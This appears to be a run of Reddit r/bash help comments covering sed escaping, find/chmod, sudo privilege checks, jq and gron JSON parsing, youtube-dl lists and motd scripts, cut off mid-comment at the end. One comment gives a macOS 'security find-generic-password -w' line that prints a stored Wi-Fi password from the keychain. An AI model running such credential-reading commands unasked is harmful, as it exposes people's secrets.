 --keep-order -k Keep sequence of output same as the order of input. Normally the output of a job will be printed as soon as the job completes. Try this to see the difference: parallel -j4 sleep {}\; echo {} ::: 2 1 4 3 parallel -j4 -k sleep {}\; echo {} ::: 2 1 4 3
Against what value? With `nullglob` set, your `for` loop won't even run if its glob fails. First guess what this script outputs, then run it to be unpleasantly surprised. #!/bin/bash shopt -s nullglob for i in foo bar; do : done for i in /tmp/nonexistent*; do echo $i done echo DONE: $i
&gt;is `download_archive_to_urls` a text file? Sorry, I managed to give one thing two different names in my answer: &gt;The `successful_downloads_to_urls` script/function is left as an exercise to the reader. That should've referred to `download_archive_to_urls`; I've corrected my answer accordingly. Thanks for spotting the typo. &gt;also is `&lt;(download\_archive\_to\_urls &lt; successful\_downloads.txt | sort)` passing whatever result this is to main.lst? No, that's a *process substitution* being passed as a "file" argument to `comm`. See the **Process Substitution** section of the [bash man page](http://man7.org/linux/man-pages/man1/bash.1.html) for details.
&gt;A lot of escaping needs to be done for this one You can actually use (almost) any other character for the slashes in sed's s command. So instead of s/\/foo/\/bar/ you could do s#/foo#/bar# or s,/foo,/bar, or.. and not have to escape anything. 
BTW , You said , "passwd -S &lt;user&gt; on each username and parse the output per your original script." . Because its doesn't supported -a parameter on CentOS/RHEL. How can I modify script ? could you please send me sample script ? 
Yes , same output. I assuming , if I catch (ALL) NOPASSWD: ALL or (ALL) ALL line which is returned from sudo -l -U command then it will work good. I am trying to use grep lines that contain either (ALL) NOPASSWD: ALL or (ALL) ALL. Am I right ? sudo -l -U "$LOGIN" | grep -q "(ALL) NOPASSWD: ALL\|(ALL) ALL" &amp;&amp; CAN_SUDO="sudo" || CAN_SUDO="" &amp;#x200B;
I just take out the middle and leave the beginning and end. $p=${PWD} [[ ${#p} -gt 24 ]] &amp;&amp; p="${p:0:12}..${p:(-12)}" echo ${p} /usr/lib/pyt..tiprocessing
Hi u/JMEWVR. Please share what progress you have already and what is troubling you.
This website is a good reference for various scripting and programming languages. If you skim this bash section then you should be able to piece together the various standard tools you need. [https://learnxinyminutes.com/docs/bash/](https://learnxinyminutes.com/docs/bash/) &amp;#x200B; Feel better man. 
I am willing to help but I'm not going to do your homework for you. You should at least try to make an attempt and ask some questions if things don't work. What specifically are you confused about with this assignment? Do you not know how to read from a pipe (stdin) from within the script? Are you unsure of how to use a for loop? You said you missed some classes but did the professor provide any study or reading material? In situations like this, most professors would be willing to set up a video recording or video conference of lectures if you let them know ahead of time. Get started and post what you've got so far and then ask questions.
Thank you man, I'll give it a read :)
Hi u/sakishrist, I literally have nothing on that part of the assignment. I've spent the past couple of days reading over the lecture slides I missed and following some tutorials but I'm still baffled. I've had trouble with other code/programming languages before but I've managed to do them to a semi-decent level but this is just baffling me. 
Hey thanks for reaching out. Pretty much I've never used any form of command line so it's all pretty new to me, I've been trying to research to better understand but it's proving to be difficult. As for missing classes. I did email my prof to see if there was any way to do this but he said the lecture room didn't have the technology to do that (pretty small room as there is only about 40-50 for this unit). He also said "try your best to keep up with the lectures/tutorials" which I did but like I said earlier, it's all pretty new to me. Also I just want to say I don't expect anyone to "do it for me" , I know it's a long shot but I'd just thought I'd see if anyone can provide some links/learning resources which could help with some of the tasks or someone to who I can go to for help in explaining how to do something if/when I get stuck. I would like to be able to do this on my own, I hate asking for help but I'm genuinely clueless. I always knew there would come a time where I would have to take the loss on a unit and settle for a low mark and I think this might be it. 
Start with this: http://ryanstutorials.net/linuxtutorial/ and https://ryanstutorials.net/bash-scripting-tutorial/ Then dig in to specific topics here: http://mywiki.wooledge.org/BashGuide Specifically you will probably need this to handle the reading of the pipeline: http://mywiki.wooledge.org/BashGuide/InputAndOutput As with any other language, the best thing to start with is a "Hello World!" script that will give you some confidence that you have something running. Then build from that and trying a basic for or while loop. If you run into problems, then post here and ask for help.
my bet would be to do the following : go at each question part one at a time google stuff like : create folders bash loop over array bash pipe bash output to new command etc 
Yeah i've been trying this but because there are so many methods and my knowledge is very limited it wasn't great. Thanks anyway pal :)
You can use "find" to do it. Go to the directory containing the files and do something like "find . -type f -exec chmod 755 {}\;". Please double check the arguments against the manual or Google, I'm on mobile now. Find will recursively modify all file permissions all the way down the directory structure. It's a really useful tool. The manual is a recommended read for other cool options.
The directory is likely already executable so probably doesn't really matter one way or the other. You can use `find`: find /path/to/directory/ -type f -exec chmod +x {} \; You should cut and paste this line since the format has to be very specific. A missing or extra space in the wrong place will make this not work or do something unexpected.
&gt; find /path/to/directory/ -type f -exec chmod +x {} \; It's much better to use a `+` at the end instead of `\;` as this will collect as many arguments as possible per `chmod` invocation, instead of invoking `chmod` once per file which is extremely inefficient. The `+` has been a standardised feature of POSIX `find` for many years now.
Works perfectly, thanks!
Total force of habit as I predate this particular feature by quite a few years. You're correct but whether it's "much better" depends on the number of files and what is being run. Chmod is pretty lightweight so as long as there's not hundreds of files, it probably won't make too much difference in execution time.
thank you. I tried the c (change) method you recommended, sed -i '/GameDBPWD="legend"/c\GameDBPWD="UyTRH%/\|()"' config.txt it works wonder :) I also tried sed -i '@GameDBPWD="legend"@c\GameDBPWD="UyTRH%/\|()"' config.txt it didn't work so well. I'm guessing @ is not a delimiter for sed when using c (change) ? I also tried with assigning the password to a new PASSWORDVAR variable. PASSWORDVAR=UyTRH\&amp;^/\\|()^; It didn't pass the variable to the sed command. sed -i '/GameDBPWD="legend"/c\GameDBPWD="${PASSWORDVAR}"' config.txt Is it possible to pass variable to the sed -i with c (change) command ? &amp;#x200B; &amp;#x200B;
How about "chmod -R +x /yourdir/" This will recursively add the execute permission to all content in yourdir.
&gt; I assuming , if I catch (ALL) NOPASSWD: ALL or (ALL) ALL line which is returned from sudo -l -U command then it will work good. No, that's a bad assumption. There is no guarantee that someone with `sudo` privileges will receive it using those rules. In a sanely run environment, `sudo` is locked down as per principle of least privilege, so for example you might see a rule like: %dba DB_SERVERS=(DB_USERS) ALL That's a valid rule that your `grep` test won't match. So in response to that, you might want to `grep` for `ALL` someidiot hostA=(root) /bin/systemctl restart httpd Is also a valid rule that `grep ALL` does not match. The only thing you can reliably depend on is "may run". Now, if you have a user who *shouldn't* have `sudo` privileges and they're returning a result like this: (ALL) NOPASSWD: ALL --&gt;&gt;&gt;&gt; This line returning (root) !/*/sudo, !/*/sudo*, !/*/*/sudo, !/*/*/sudo*, !/*/*/*/sudo, !/*/*/*/sudo* Then the problem isn't with the check method, the problem is with `sudo`'s configuration itself. Without seeing your `sudoers` (and `sudoers.d`, if you're using it) files, I can't be much more help than that. BTW I work with RHEL every day. No problems here.
I'd use +x instead of 755 though.
Several nitpicks about your "simple" claim: * What's with all the unnecessary semicolons? * What's with the `clear`? Is it to wipe away `wget`'s logging output for a clean presentation? If so, better to tell `wget` to be quiet in the first place. * Unnecessary repeat invocations of `html2text`. * `grep '* [TD]ebian'`: You're expecting to match an OS named _Tebian_? * `grep '* [TD]ebian'` also picks up the _Debian Packages_ line in the page footer, which is clearly _not_ a release. * What's with the `sleep 60` at the _end_ of the script? What purpose does it serve? Also, `html2text` underlines links by default, making for some ugly output. It can be turned off via a custom `html2textrc`, but dealing with that takes the "simple" out of the script, and perhaps you intended to highlight the release names anyway, so I won't quibble further about it. (Why the author decided not to allow command-line configuration via `-O &lt;key&gt;=&lt;val&gt;` is another matter entirely.) Here's a simpler script that captures the essence of yours: ``` #Requires: html2text, wget wget -q -O - https://www.debian.org/releases/ | html2text &gt; /tmp/debian.txt cat &lt;&lt;EOF $(grep '* Debian.*[Rr]elease' /tmp/debian.txt) $(grep 'current testing' /tmp/debian.txt) ----------------------------------------------------------- This system: $(lsb_release -a) EOF rm -f /tmp/debian.txt ```
Also: silently blowing away any index.html files you might have in the directory. That's definitely not expected behavior. 
Is that the input or the desired output? Your question is somewhat unclear. Its possible this utility might help you. [https://github.com/tomnomnom/gron](https://github.com/tomnomnom/gron)
When given as input the text you posted, and no arguments, gron produces the following output, which might be more easily manipulated in bash: json = {}; json.added = "2018-09-17T19:45:23.086747Z"; json.alternativeTitles = []; json.cleanTitle = "darkesthour"; json.dateAdded = "2018-09-17T19:46:53.651787Z"; json.downloaded = true; json.edition = ""; json.folderName = "/volume2/Data_2/Movies/Darkest Hour (2017)"; json.genres = []; json.hasFile = true; json.id = 1741; json.images = []; json.images[0] = {}; json.images[0].coverType = "poster"; json.images[0].url = "/MediaCover/1612/poster.jpg"; json.images[1] = {}; json.images[1].coverType = "fanart"; json.images[1].url = "/MediaCover/1612/fanart.jpg"; json.imdbId = "tt4555426"; json.inCinemas = "2017-11-22T00:00:00Z"; json.isAvailable = true; json.lastInfoSync = "2018-11-17T10:53:31.291978Z"; json.mediaInfo = {}; json.mediaInfo.audioAdditionalFeatures = ""; json.mediaInfo.audioBitrate = 384000; json.mediaInfo.audioChannelPositions = "3/2/0.1"; json.mediaInfo.audioChannelPositionsText = "Front: L C R, Side: L R, LFE"; json.mediaInfo.audioChannels = 6; json.mediaInfo.audioCodecID = "A_AC3"; json.mediaInfo.audioCodecLibrary = ""; json.mediaInfo.audioFormat = "AC-3"; json.mediaInfo.audioLanguages = "English"; json.mediaInfo.audioProfile = ""; json.mediaInfo.audioStreamCount = 1; json.mediaInfo.containerFormat = "Matroska"; json.mediaInfo.height = 688; json.mediaInfo.runTime = "02:04:55.4560000"; json.mediaInfo.scanType = "Progressive"; json.mediaInfo.schemaRevision = 5; json.mediaInfo.subtitles = "English"; json.mediaInfo.videoBitDepth = 8; json.mediaInfo.videoBitrate = 4130830; json.mediaInfo.videoCodecID = "V_MPEG4/ISO/AVC"; json.mediaInfo.videoCodecLibrary = ""; json.mediaInfo.videoColourPrimaries = "BT.709"; json.mediaInfo.videoFormat = "AVC"; json.mediaInfo.videoFps = 23.976; json.mediaInfo.videoMultiViewCount = 0; json.mediaInfo.videoProfile = "High@L3.1"; json.mediaInfo.videoTransferCharacteristics = "BT.709"; json.mediaInfo.width = 1280; json.minimumAvailability = "tba"; json.monitored = true; json.movieId = 0; json.overview = "A thrilling and inspiring true story begins on the eve of World War II as, within days of becoming Prime Minister of Great Britain, Winston Churchill must face one of his most turbulent and defining trials: exploring a negotiated peace treaty with Nazi Germany, or standing firm to fight for the ideals, liberty and freedom of a nation. As the unstoppable Nazi forces roll across Western Europe and the threat of invasion is imminent, and with an unprepared public, a skeptical King, and his own party plotting against him, Churchill must withstand his darkest hour, rally a nation, and attempt to change the course of world history."; json.path = "/volume2/Data_2/Movies/Darkest Hour (2017)"; json.pathState = "static"; json.physicalRelease = "2018-02-06T00:00:00Z"; json.physicalReleaseNote = ""; json.profileId = 1; json.quality = {}; json.quality.customFormats = []; json.quality.quality = {}; json.quality.quality.id = 4; json.quality.quality.modifier = "none"; json.quality.quality.name = "HDTV-720p"; json.quality.quality.resolution = "r720P"; json.quality.quality.source = "tv"; json.quality.revision = {}; json.quality.revision.real = 0; json.quality.revision.version = 1; json.ratings = {}; json.ratings.value = 7.3; json.ratings.votes = 2122; json.relativePath = "Darkest Hour (2017).mkv"; json.runtime = 125; json.secondaryYearSourceId = 0; json.size = 4231957865; json.sizeOnDisk = 4231957865; json.sortTitle = "darkest hour"; json.status = "released"; json.studio = "Perfect World Pictures"; json.tags = []; json.title = "Darkest Hour"; json.titleSlug = "darkest-hour-399404"; json.tmdbId = 399404; json.website = "http://www.focusfeatures.com/darkesthour/"; json.year = 2017; json.youTubeTrailerId = "eFFj2gS9UWs"; 
that would be the desired output. currently the command i uses doesn't return all the data only a partial amount of the data.. &amp;#x200B; I'll take a look at gron and see if i can use it to get my answer.
Thanks, Though it seems to have cut some of the data off, especially the bottom part where it shows qualityProfileId and id. &amp;#x200B; And i've just checked and it's not compatible with my machine as it's running an Arm processor.
&gt; ``` This kind of formatting doesn't work in oldreddit, FYI.
&gt; }, &gt; "qualityProfileId": 1, &gt; "id": 1612 &gt; } I believe the reason that data is getting cut off is that the "}," before qualityProfileId matches the opening "{" of the file. How'd you grab this json? 
What's the _input_ from which you're trying to generate `output.txt`? If it's a single file along the lines of: ``` { "title": "Darkest Hour", ... } { "title": "The Longest Day", ... } ``` then you need to pass the `-s` (slurp) option to `jq` for it to deal with it correctly. Then if you wanted to search for, say, "Darkest Hour (2007)", which is in `$var`: ``` jq -s 'map(select('$(sed -E 's/(.*) \(([0-9]+)\)/.title=="\1" and .year==\2/'&lt;&lt;&lt;"$var")'))' &lt; input.txt &gt; output.txt ```
The Info comes from an API call which returns all the info in JSON format. &amp;#x200B; I've just played around with it on a windows machine / notepadd ++ and it looks like some of the formatting changed. &amp;#x200B; I've ran it through a vm that gron will install on and it seems to give the id response in the output.
The source is provided, you can compile it on any architecture you want.
Put a space between `[` your test and `]`. Treat the `[` like you would a program name, since it's literally a synonym for the `test` command.
I did try installing it with go at the start but it looked like it didn't work. Then i realised i hadn't set my go path files so it's now installed on my main machine. &amp;#x200B; Now just running through and seeing how the data comes out with different input
&gt;BTW , You said , "passwd -S &lt;user&gt; on each username and parse the output per your original script." . Because its doesn't supported -a parameter on CentOS/RHEL. How can I modify script ? could you please send me sample script ? Ok man. My last question as you know its doesn't supported -a parameter on CentOS/RHEL. First of all I will get all fields via passwd -S &lt;user&gt; on each username and parse the output per your original script. How can I modify script ? could you please send me sample script ? 
Why is that?
You are injecting the data into jq there, and failing at it. Pass it on via arguments or env instead. Also no need for the slurp option var='Darkest Hour (2017)' re='(.*) \((.*)\)' [[ $var =~ $re ]] &amp;&amp; jq --arg title "${BASH_REMATCH[1]}" --arg year "${BASH_REMATCH[2]}" \ 'select(.title == $title and .year == ($year|tonumber))' input.json
Argh, must remember not to post before initial caffeine input.
Oh AppleScript, how I miss thee...**NOT!!!** One thing I usually ask myself, when trying to rewrite an old script in another language, is what I really want to have happen, instead of trying to do a literal translation. In this case, it seems like a more useful and clearer "translation" is: # Are there any panic reports? grep -Rl 'Panic Report' /Library/Logs/DiagnosticReports/ &gt; /tmp/panics.lst if [ -s /tmp/panics.lst ]; then # Make a clean slate rm -fr ~/Desktop/PanicLogs mkdir -p ~/Desktop/PanicLogs # Copy them all over while read F; do cp "$F" ~/Desktop/PanicLogs done &lt; /tmp/panics.lst echo "Some panics found - please see PanicLogs folder" open ~/Desktop/PanicLogs else echo "No one is panicking here" fi rm -f /tmp/panics.lst
This comment is premature since I'm figuring this out piecemeal as I get bits of time. Working backwards though, by using `comm -1 main.lst &lt;(download_archive_to_urls &lt; successful_downloads.txt | sort) &gt; work.lst` xargs can be used now without fretting over the order the video downloads finish. This is because `successful_downloads.txt` is converted into proper URLS, which unlocks the capability to `sort` inputted URLS and `successful_downloads.txt` into a synchronized order--this fixes the restriction from before of having video\_two finish sooner than video\_one, therefore messing up the order and losing the ability to check an input URL against the `successful_downloads.txt` list. The issue I can't see how to fix right now is the regex: 's@\^youtube \\(.\*\\)$@[https://www.youtube.com/watch?v=\\1@](https://www.youtube.com/watch?v=\1@)' These URLS come from different sites, some with and without https and etc. Isn't this too unpredictable?
&gt;This is because `successful_downloads.txt` is converted into proper URLS, which unlocks the capability to `sort` inputted URLS and `successful_downloads.txt` into a synchronized order--this fixes the restriction from before of having **video\_two** finish sooner than **video\_one**, therefore messing up the order and losing the ability to check an input URL against the `successful_downloads.txt` list. Yes. That's also why I `sort`ed `main.lst`, otherwise `comm` would be mighty confused when it tried to "diff" both lists. &gt;The issue I can't see how to fix right now is the regex: `'s@^youtube \(.*\)$@https://www.youtube.com/watch?v=\1@'` These input URLS come from different sites, some with and without https and etc. Isn't this too unpredictable? If you're referring to disambiguating between, say, and/all of: * `https://youtube.com/watch?v=ytA_h8NB3h0` * `https://www.youtube.com/watch?v=ytA_h8NB3h0` * `https://youtu.be/ytA_h8NB3h0` * `https://bit.ly/MSChangeUserPass` (link-shorteners are a **pain** in this regard) then yes, that's a problem you'll have to solve yourself, canonicalizing all the URLs above to a common format before putting them in `main.lst`. If "sanitizing" your input URLs is too much of a problem, you may be better off simply running `youtube-dl --download-archive done.lst &lt;url&gt; &lt;url&gt; ...` repeatedly, until its output tells you that *none* of the URLs you gave it were downloaded, i.e. you're done, or it couldn't overcome some download problems. As for the regex, I'm now regretting the use of `sed` as an example. Here's a clearer version of `download_archive_to_urls` that clarifies what needs to be done: while read SITE VID_ID; do case "${SITE}" in youtube) echo "https://youtube.com/watch?v=${VID_ID}";; vimeo) echo "https://vimeo.com/${VID_ID}";; # Add other sites here esac done
Great review, but isn't it still bad practice for a random script to output to a hardcoded file? That's what `mktemp` is for. Also, the file could be left if the user interrupts it midway. That's what `trap` is for, but this script is getting more complicated, so why not simply set the output to a variable instead of redirecting it to a file?
All great points, but counterbalanced by the fact that the script _scrapes a web page_, so its primary input can vary quite unexpectedly. Outputting to a known filename, that can be adjusted to meet reasonable expectations of uniqueness (I actually tend to use `/tmp/"$(basename "$0")".&lt;appropriate_extension&gt;` in such situations) greatly aids subsequent debugging should it suddenly be required, without the hassle of instrumenting and running it a second time with proper captures...and discovering that it's an elusive Heisenbug.
It won’t mess with the permissions other than making them executable. 
Sed optionally takes an Address of the form `/regexp/`, (must be forward slashes). When a command is preceded by an address, the command will only be applied on lines that match the regular expression. Bash won't expand variables inside `'strong quotes'`. You can `"weak quote"` your sed string, allowing bash to expand your variable before sed reads its script. You might have problems with the double-quotes in your data, and you have to escape the backslash again for the extra process. Try this: pwd="UyTRH\&amp;^/\\\|()^" # ^^ note the extra escape! sed "/GameDBPWD=/s,legend,${pwd},g" config.txt
This sounds like you want help with your homework/lab work. 
This is not homework/lab work. I’m working on something on my home computer. 
'ls' lists files on the screen which isn't really needed for a script. A simple for loop would probably do the trick: &amp;#x200B; for file in \*.csv ; do wc -l "$file" ; done
Thank you. This works wonder also. pwd="UyTRH\\&amp;\^/\\\\\\|()\^" # ^^ note the extra escape! sed "/GameDBPWD=/s,legend,${pwd},g" config.txt &amp;#x200B; &amp;#x200B;
To break it down a bit: &amp;#x200B; `for file in *.csv` means to take all files that match (\*.csv) and loop through them and assign the variable `$file` on each loop. `; do wc -l "$file"` is what you're doing on each loop -- the $file bit is going to become whatever .csv file you are working with `; done` means the loop is over and to start again with the next file.
No News for a Loop, Just do: wc -l ".csv 
Since it hasn’t been explicitly pointed out yet, the pipe operator `|` is how you “chain” the output of one function to the input of another: `ls *.csv | wc-l` but I do agree there are better ways to skin this cat.
what do you need help with, specifically? Can we see what you've tried?
I agree with you that this is what OP asked for. Thank you for posting it. &gt; but I do agree there are better ways to skin this cat. The caution against doing it this way should be stronger than this. Not only is the `ls` unnecessary, as others have shown, but it's actually a very bad practice to manipulate the output of programs that don't format their output in a reliable way. tl;dr: `ls` is for people, not scripts: don't script using `ls`.
Hard to believe. &gt; the files must first three letter must be uppercase if not I want to send the files to a archive folder ... only a community college teacher would come up with such a senseless scenario. 
I tried creating a service and rsycing the file to the sub folder(I will show you what I specifically tried once I get back in front of a cpu). I need help with the script part that would parse the files and then push those files to the subfolders. 
Ok. Thanks for your help
No disagreement with your word of caution, I just think there are more immediate benefits to presenting new users with a means to do things using tools they already know, rather than go on about things like the dangers of manipulating unformatted output or useless use of `cat`.
Thank you very much for your corrections; very instructive. The additional semicolons are for code formatting. I'm not sure what is the correct way to publish code. The sleep 60 at the end is because I call some bash scripts from an xterm -e instructions. After this time the xterm window closes automatically.
I don't understand what you are trying to iterate over. If you want to iterate over each variable defined in the function you could do something like type -a datanode1 | awk '/=/ {print $1}'| while read -r i; do echo "i=$i"; done
You delete it at the end of the script, though, and there are no conditions to exit before that. If you set it to a variable, you simply have to source the script to access it; not really a hassle.
Ok
&gt;You delete it at the end of the script Sorry, that was just me mirroring the OP's script. In real life, when I use a well-known filename, I _never_ delete it in the script, but I may delete it manually later, depending on circumstances. &gt;If you set it to a variable, you simply have to source the script to access it; not really a hassle. Not sure what you're getting at here. If I set the output to a variable, as you mentioned before, doesn't that value disappear permanently at script's end? Sourcing the script merely runs it again, potentially scraping different contents the second time. There's another reason I generally avoid putting scraped output in a variable: _no constraints_. If the scraped content turns out to be a lot larger than I expected, putting it in a file fills up a temp partition at worst. That's no biggie, and fairly easy to recover from. Slurping it all into memory...is a recipe for pain.
&gt; Sorry, that was just me mirroring the OP's script. In real life, when I use a well-known filename, I never delete it in the script, but I may delete it manually later, depending on circumstances. That makes more sense. &gt; Not sure what you're getting at here. If I set the output to a variable, as you mentioned before, doesn't that value disappear permanently at script's end? Sourcing the script merely runs it again, potentially scraping different contents the second time. Yes, although I don't see why there would be different results the second time. And if you'd be interested in possibly debugging it, you can actually just source it the first time since it's a simple script and only sets one variable. &gt; There's another reason I generally avoid putting scraped output in a variable: no constraints. If the scraped content turns out to be a lot larger than I expected, putting it in a file fills up a temp partition at worst. That's no biggie, and fairly easy to recover from. &gt; &gt; Slurping it all into memory...is a recipe for pain. That's a good point, but I don't think it will happen with Debian's website.
Assuming each tarball contains: out/file2 out/dir1/file3 ... and you're using GNU tar (which is smart enough to deal with compressed tarballs directly) then: for f in */out.tbz2; do tar -xf "$f" -C "${f%/*}" done If each tarball contains: file2 dir1/file3 ... then you'd have to create the `.../out` directory first: for f in */out.tbz2; do d="${f%/*}/out" mkdir -p "$d" &amp;&amp; tar -xf "$f" -C "$d" done The `-C` flag to `tar` tells it to **cd** internally to the named directory before doing its deed.
&gt;Yes, although I don't see why there would be different results the second time. Web scraping carries no assurance of permanence in structure or layout... &gt;That's a good point, but I don't think it will happen with Debian's website. ...or data volume, or even fit for purpose. Corrupted websites are still a thing. Web scraping is one of the few areas where I assume _anything_ can go wrong, and will therefore _carefully_ break "good practice" rules (e.g. randomly-generated temp files, and clean up afterwards) so that my response to "WTF happened?!?!" doesn't have to be "I dunno, let's try to trigger it again".
&gt;how are the functions acting as arrays? They don't. Assuming you want to load the config info for multiple nodes, yet be able to access each node's variables independently, associative arrays are probably your best bet: $ cat setup/datanode1.cfg home_dir=/path/to/home1 cfg_dir=/path/to/cfg1 user=john max_open_files=262114 $ cat setup/datanode2.cfg home_dir=/path/to/home2 cfg_dir=/path/to/cfg2 user=mary max_open_files=16384 $ cat run.sh #!/bin/bash declare -A cluster for f in setup/*.cfg; do # Derive nodename from cfg filename nodename="$(basename "$f" .cfg)" while read cfgline; do # Use a regex to tear the config line apart [[ "$cfgline" =~ (.*)=(.*) ]] &amp;&amp; cluster["${nodename},${BASH_REMATCH[1]}"]="${BASH_REMATCH[2]}" done &lt; "$f" done # What does $cluster[] look like? declare -p cluster datanode1/cfg_dir = /path/to/cfg1 datanode2/user = mary $ ./run.sh declare -A cluster=([datanode1,home_dir]="/path/to/home1" [datanode1,user]="john" [datanode2,cfg_dir]="/path/to/cfg2" [datanode1,max_open_files]="262114" [datanode2,user]="mary" [datanode2,home_dir]="/path/to/home2" [datanode2,max_open_files]="16384" [datanode1,cfg_dir]="/path/to/cfg1" ) datanode1/cfg_dir = /path/to/cfg1 datanode2/user = mary
Just remembered some things: 1. `/tmp` often resides in memory instead of a partition. I'm not sure how it handles getting filled up, though. 2. Variables actually have a max amount of characters, I think. 3. Wouldn't the user notice if it downloads a humongous file? I don't know how small most users' RAM and how fast their internet is, but it would take around 7 hours to fill up my 8 GB of RAM with my internet speed.
I wanted to try this with pure bash. Assumes Bash 4. I would be interested if someone on a real distro (not WSL) could run a speed comparison between this and the OP. awd(){ w='\w'; IFS=/ read -a a &lt;&lt;&lt; "${w@P}" #1 ((c=${#a[@]}-1)) #2 for i in "${a[@]::$c}"; do #3 printf '%s/' ${i:0:1} #4 done; echo "${a[$c]}" #5 } 1) @P is Parameter Transformation - Prompting. Read '\w' as though it were read by the prompt system into a `/`-delimited array. (converts `/home/$USER` to `~`) 2) Get the highest index of `a`. 3) Iterate through all but the last index of `a`, 4) printing only the first character of each. 5) Print the last element. (Current directory)
Looks nice! Tested on my machine, it also clocks in somewhere between 7 and 10 ms. It has the same problem as my command, namely that a path `/home/user/.hidden/secrets` Is shortened to `~/./secrets` and not the more desired/expected `~/.h/secrets`
Thanks for all the replies! I get it now. :) 
Great suggestion! Adding that now.
To output this to a variable would i write var=$\{wc -l \*.csv\}
The simple sed one-liner for search and replace in sed is sed -i 'bak' 's/SEARCH STRING/REPLACE STRING/g' where g tells sed to apply this replace 'globally', on all entries of search string that were found in a document. the -i flag tells sed to replace 'in-place', creating a backup of the original file and then applying your edit on the original. So, for multiple files, you could write the one liner like for f in file1 file2 file3 file4 file5; do sed -i 'bak' 's/print\ /LOGGER\.DEBUG\(/g' $f; done we're escaping the special characters (space, period and bracket here) to make sed search for them as literal characters. 
I hope that's a typo at the end of "To:" line 2 awk '{$1="";printf("LOGGER.DEBUG("substr($0,2)")\n")}' file1 file2 file3 etc
Couple things. `.` and `(` don't need to be escaped in the replacement string, this replacement doesn't meet OP's criteria, and sed takes multiple files out of the box.
&gt;To output this to a variable would i write &gt; &gt;var=${wc -l *.csv} var=$(wc -l *.csv) This is called command substitution. The variable is assigned the results of the command inside $(). You need to use parentheses for this, not braces.
Cool, thanks. Learn something new every day. :)
`ls` outputs a list of files/directories to stdout. You can use the result of that command however you want. 
Why not include it in your .bashrc instead? Does it really need to be a system wide MOTD?
I didn’t hear about this method All my motd system wide
One of the scripts in /etc/update-motd.d/ is probably returning non-zero, so it aborts the update and shows you the last successfully generated motd.
[Screen](https://imgur.com/a/lEtDlRv) Exit status 0 
^(Hi, I'm a bot for linking direct images of albums with only 1 image) **https://i.imgur.com/GCKoNaq.png** ^^[Source](https://github.com/AUTplayed/imguralbumbot) ^^| ^^[Why?](https://github.com/AUTplayed/imguralbumbot/blob/master/README.md) ^^| ^^[Creator](https://np.reddit.com/user/AUTplayed/) ^^| ^^[ignoreme](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=ignoreme&amp;message=ignoreme) ^^| ^^[deletthis](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=delet%20this&amp;message=delet%20this%20ebs168f) 
Offtopic, but have you tried Hacker's Keyboard?
Yes, when I used Android phone
Remove the `echo "\`` and `\`"` - the `column.... | tail... ` already sends output to `stdout`
Without "` and `" server@phoenix ~ $ bash update-motd.d/50-flexget Flexget ACCEPTED: column -t -s % /home/server/.flexget/accepted.log
And without echo have same output That 2 first strings from accepted.log
Hi again, managed to get myself to 1d on the task sheet but I'm struggling a bit. On task 1c used 'x' to represent the files (File\_$x.txt) in the loop so I'm assuming that needs to be used again. Breaking it down logically the steps should be... read the input from the user (read $f) &gt; if statement, if the users input = File\_x.txt &gt; copy to the backup folder and rename to File\_x.bak This may be wrong but I've got the commands I have been trying and would be grateful if I could show you them as they're more than likely wrong and you could let me know if they're completely wrong or if they are along the right lines but the syntax are off. Thanks in advance :)
&gt; That 2 first strings from accepted.log Have a look at that log file - there isn't a blank line after "The Last Ship" is there?
See screens again If I run script manually, works fine And log have 116 strings
bye.
For solving the actual problem (`= not found`), are you sure you're using bash? What does `echo $0` print? What does `bash --version` print? For a few other issues in your function: You're `usage` echo is a bit messed up, but I don't know whether that's just a formatting error on here: you have `\optional` which I suspect should be `\noptional` to get a newline, and you close your quotes between the two optional params instead of at the end of the line. I would have three `echo`es instead of embedding newlines. You have a line `$2 += ".$2"` which is going to try to execute the command whose name is stored in `$2` with '+=' as the first argument, so if you run `vscf meow exit`, you are going to get a surprise. You should also quote your `$1` and `$2` when used in a command, otherwise, an invocation like `vscf 'two words'` will break (even if `'two words'` isn't a valid argument for `-n`).
Is there any comment about with my last question ?
Hey sorry about my tone. I came off really pompous and that's not fair. Best of luck with your journey.
String comparison in Bash is `[”$foo” = “bar”]`, not `[”$foo” == “bar”]`. As a matter of design, `[[ ` is preferred over `[` when invoking a test, but that’s irrelevant here.
I think the route I'll take is just to move the `failed_vid_urls.txt` generator out of the youtube-dl loop and into a separate dedicated `while read` that iterates over a `scraped_urls.txt` list. Inside this `while read` will be a nested `while read` that iterates over `successful_downloads.txt`, allowing me to do a regex search using the 'unsanitized' `successful_downloads.txt`. I didn't see anything in the youtube-dl github issues list, but do you have any idea how to prevent youtube-dl from downloading mirrored videos when using a generic extractor? It's messing up my `successful_downloads.txt` list by downloading the same video twice and naming both videos in a nonstandard format--`some_video` changes to two duplicate videos named `some_video-1` and `some_video-2`. I could exclude the last 2 characters in my regex search I guess, but this is annoying.
You might have better luck over at r/macsysadmin, but unless I'm mistaken, the answer's "not without exposing the password somehow". `networksetup -setairportnetwork` requires your Wi-Fi password as an argument, so you either have to hardcode it in your script, or query for it from some service. Either way, everyone you allow to run that script can inspect it and see/query the Wi-Fi password for themselves. For completeness, here's how you'd go about it the "traditional" keychain-based way: ``` WIFI_PASSWD="$(security find-generic-password -a "$SSID" -w)" networksetup -setairportnetwork "$INTERFACE" "$SSID" "$WIFI_PASSWD" ``` 
&gt;`/tmp` actually often resides in memory instead of a partition. Not in any of the systems I manage. I know Debian and Ubuntu flat-out reject this "optimization", and while I sorta understand their fast-*fast*-**FAST** appeal, I'd wager the other distro vendors haven't had the pleasure of a "memory's too tight to mention" situation... &gt;I'm not sure how it handles getting filled up, though. Not well. I seem to remember that it defaults to using half of available RAM, but as applications start committing more memory, `tmpfs` will get squeezed until there's no free space left. Enter the tarpit of Swap City, or (if no swap configured) someone's getting `kill`'d. &gt;Variables actually have a max amount of characters, I think. _Environment_ variable space is definitely capped (see **Limits on size of arguments and environment** in [execve(2)](http://man7.org/linux/man-pages/man2/execve.2.html)), but the only limit to _shell_ variable size is available memory (try, for example, [this test script](https://stackoverflow.com/a/49119526), though I'd recommend adding `ulimit -m 2147483648` to set a hard 2GB limit on your run). &gt;Wouldn't the user notice if it downloads a humongous file? Depends on how long they expect their programs to run. Also, I've lost count of the number of times I've been called away to fix stuff right after I type in a command, so noticing that a simple download is now spiraling out of control isn't guaranteed. &gt;I don't know how small most users' RAM and how fast their internet is, but it would take around 7 hours to fill up my 8 GB of RAM with my internet speed. You'd start with actual free RAM, which in most cases is substantially less than what's installed, especially with those dadgum fancy 